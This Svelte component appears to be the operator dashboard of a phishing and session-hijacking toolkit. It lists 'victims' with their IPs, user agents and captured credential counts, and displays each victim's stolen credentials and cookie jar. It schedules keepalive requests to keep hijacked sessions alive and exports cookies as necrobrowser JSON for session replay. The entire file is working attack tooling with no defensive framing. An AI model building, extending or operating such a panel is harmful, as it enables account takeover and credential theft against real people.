<script>
  import { onMount } from 'svelte';
  import { api } from '../lib/api.js';
  let victims = [], selected = null, err = '', busy = false;
  let keepaliveInfo = null, keepaliveIntervalMin = 10, keepaliveErr = '', keepaliveMsg = '';

  async function load() {
    try { victims = await api('/victims'); } catch (e) { err = e.message; }
  }
  async function open(v) {
    try {
      selected = await api('/victims/' + v.id);
      await loadKeepaliveInfo();
    } catch (e) { err = e.message; }
  }
  function closeDrawer() {
    selected = null;
    keepaliveInfo = null; keepaliveErr = ''; keepaliveMsg = '';
  }
  async function instrument(id) { busy = true; try { await api('/victims/' + id + '/instrument', { method: 'POST' }); } finally { busy = false; } }
  async function del(id) {
    if (!confirm('Delete victim ' + id + '?')) return;
    await api('/victims/' + id, { method: 'DELETE' });
    selected = null; await load();
  }
  function cookieJSON(v) { return JSON.stringify(v.cookies ?? [], null, 2); }

  async function loadKeepaliveInfo() {
    keepaliveInfo = null; keepaliveErr = ''; keepaliveMsg = '';
    if (!selected) return;
    try {
      const all = await api('/keepalives');
      keepaliveInfo = all.find((k) => k.victimID === selected.id) ?? null;
      if (keepaliveInfo?.intervalMin) keepaliveIntervalMin = keepaliveInfo.intervalMin;
    } catch (e) { keepaliveErr = e.message; }
  }
  async function startKeepalive() {
    keepaliveErr = ''; keepaliveMsg = '';
    try {
      await api('/keepalives', { method: 'POST', body: { victimID: selected.id, intervalMin: keepaliveIntervalMin } });
      keepaliveMsg = 'keepalive started';
      await loadKeepaliveInfo();
    } catch (e) { keepaliveErr = e.message; }
  }
  async function runKeepaliveNow() {
    keepaliveErr = ''; keepaliveMsg = '';
    try {
      await api('/victims/' + selected.id + '/keepalive', { method: 'POST' });
      keepaliveMsg = 'keepalive sent';
    } catch (e) { keepaliveErr = e.message; }
  }
  async function stopKeepalive() {
    keepaliveErr = ''; keepaliveMsg = '';
    try {
      await api('/keepalives/' + selected.id, { method: 'DELETE' });
      keepaliveMsg = 'keepalive stopped';
      await loadKeepaliveInfo();
    } catch (e) { keepaliveErr = e.message; }
  }
  async function copyNecrobrowserJSON() {
    keepaliveErr = ''; keepaliveMsg = '';
    try {
      const cookies = await api('/victims/' + selected.id + '/cookies');
      await navigator.clipboard.writeText(JSON.stringify(cookies, null, 2));
      keepaliveMsg = 'necrobrowser JSON copied to clipboard';
    } catch (e) { keepaliveErr = e.message; }
  }
  onMount(load);
</script>

<h1 class="text-2xl font-bold mb-4">Victims</h1>
{#if err}<p class="text-red-400">{err}</p>{/if}

<table class="w-full text-sm">
  <thead class="text-slate-400 text-left">
    <tr><th class="p-2">ID</th><th>IP</th><th>UA</th><th>Creds</th><th>Instrumented</th><th></th></tr>
  </thead>
  <tbody>
    {#each victims as v}
      <tr class="border-t border-slate-800 hover:bg-slate-900 cursor-pointer" on:click={() => open(v)}>
        <td class="p-2 font-mono">{v.id}</td>
        <td>{v.ip}</td>
        <td class="truncate max-w-xs">{v.ua}</td>
        <td>{v.credsCount}</td>
        <td>{v.instrumented ? 'yes' : 'no'}</td>
        <td><button class="text-red-400" on:click|stopPropagation={() => del(v.id)}>delete</button></td>
      </tr>
    {/each}
  </tbody>
</table>

{#if selected}
  <div class="fixed right-0 top-0 h-full w-[28rem] bg-slate-900 border-l border-slate-800 p-6 overflow-auto">
    <button class="text-slate-400 mb-4" on:click={closeDrawer}>close ✕</button>
    <h2 class="text-lg font-semibold font-mono">{selected.id}</h2>
    <div class="mt-4 space-x-2">
      <button class="px-3 py-1 rounded bg-indigo-600" disabled={busy} on:click={() => instrument(selected.id)}>Force instrument</button>
    </div>

    <h3 class="mt-6 font-semibold">Keepalive</h3>
    {#if keepaliveErr}<p class="text-red-400 text-xs">{keepaliveErr}</p>{/if}
    {#if keepaliveMsg}<p class="text-green-400 text-xs">{keepaliveMsg}</p>{/if}
    <p class="text-xs text-slate-400 mb-2">
      {#if keepaliveInfo}
        active, every {keepaliveInfo.intervalMin}min (next: {keepaliveInfo.nextRun ?? 'n/a'})
      {:else}
        not scheduled
      {/if}
    </p>
    <div class="flex items-center gap-2">
      <input type="number" min="1" class="w-20 px-2 py-1 rounded bg-slate-800 text-sm" bind:value={keepaliveIntervalMin} />
      <span class="text-xs text-slate-400">min</span>
      <button class="px-3 py-1 rounded bg-slate-700 text-sm" on:click={startKeepalive}>Start</button>
      <button class="px-3 py-1 rounded bg-slate-700 text-sm" on:click={runKeepaliveNow}>Run now</button>
      {#if keepaliveInfo}
        <button class="px-3 py-1 rounded bg-red-700 text-sm" on:click={stopKeepalive}>Stop</button>
      {/if}
    </div>

    <h3 class="mt-6 font-semibold">Credentials</h3>
    <pre class="text-xs bg-slate-950 p-2 rounded overflow-auto">{JSON.stringify(selected.credentials, null, 2)}</pre>

    <h3 class="mt-4 font-semibold">Cookie jar (necrobrowser JSON)</h3>
    <button class="px-3 py-1 rounded bg-slate-700 text-sm mb-2" on:click={copyNecrobrowserJSON}>Copy necrobrowser JSON</button>
    <pre class="text-xs bg-slate-950 p-2 rounded overflow-auto">{cookieJSON(selected)}</pre>
  </div>
{/if}
